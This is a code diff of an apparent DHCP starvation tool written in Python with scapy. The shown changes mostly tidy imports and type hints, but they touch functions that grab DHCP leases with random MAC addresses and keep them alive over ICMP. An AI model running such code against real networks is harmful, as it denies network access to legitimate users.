@@ -1,4 +1,4 @@
-from scapy.all import *
+from scapy.all import (Ether, ETHER_TYPES, ETHER_BROADCAST, sendp, BOOTP, DHCP, IP, UDP, conf, RandMAC, sniff, DHCPTypes)
 import time
 import binascii
 import threading
@@ -64,7 +64,6 @@ def random_transaction_id():
     transaction_id = random.randint(0, 0xFFFFFFFF)
     logger.debug(f"{function_name} : random_transaction_id = {transaction_id}")
     return transaction_id
-
 
 
 def mac_to_binary(regular_mac : str):
@@ -244,7 +243,7 @@ def is_for_my_mac(mac : str, packet):
     logger.debug(f"{function_name} : {packet} is destined for {packet[Ether].dst} and provided mac is {mac}")
     return packet[Ether].dst == mac
 
-def find_dhcp_option(option : str, dhcp_pdu : scapy.layers.dhcp.DHCP):
+def find_dhcp_option(option : str, dhcp_pdu : DHCP):
     """
     Doesnt check is pdu is dhcp
     Gets a DHCP PDU and a MAC
@@ -273,7 +272,7 @@ def is_bootp_reply(packet)->bool:
 
 
 
-def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5)->List[Tuple[str, str, str]]:
+def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5)->list[tuple[str, str, str]]:
     """
     TODO check if dhcp request if acked
     TODO option to keep alive ip's while starving
@@ -285,7 +284,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
 
     function_name = inspect.currentframe().f_code.co_name
     
-    occupied_ips: List[Tuple[str, str]] = []
+    occupied_ips: list[tuple[str, str]] = []
     is_acked : bool = True
 
     logger.info(f"{function_name} : starving {ips_to_starve} IPs from {server_ip} , {server_mac}")
@@ -332,15 +331,19 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         
         logger.info(offered_ip + ',' + temp_mac)
         
-
+        #TODO start a thread that sniffs for ACK or NAK
 
         dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip, interface)
         
+        #TODO stop the thread and check if we got ACKed
+
         if(is_acked):
             occupied_ips.append((offered_ip, temp_mac, interface))
         
         try:
+
             keep_alive_thread.join()
+
         except:1
         
         if(time_to_wait >= 2):
@@ -359,7 +362,7 @@ def sendp_icmp(src_ip : str, src_mac : str, dst_ip : str, dst_mac : str, interfa
     
     sendp(packet, iface=interface)
 
-def keep_ips_alive_icmp(devices : List[Tuple[str,str]], dhcp_server_ip : str, dhcp_server_mac : str):
+def keep_ips_alive_icmp(devices : list[tuple[str,str]], dhcp_server_ip : str, dhcp_server_mac : str):
     function_name = inspect.currentframe().f_code.co_name
     logger.info(f"{function_name} : keeping alive these ips : {devices}")
     
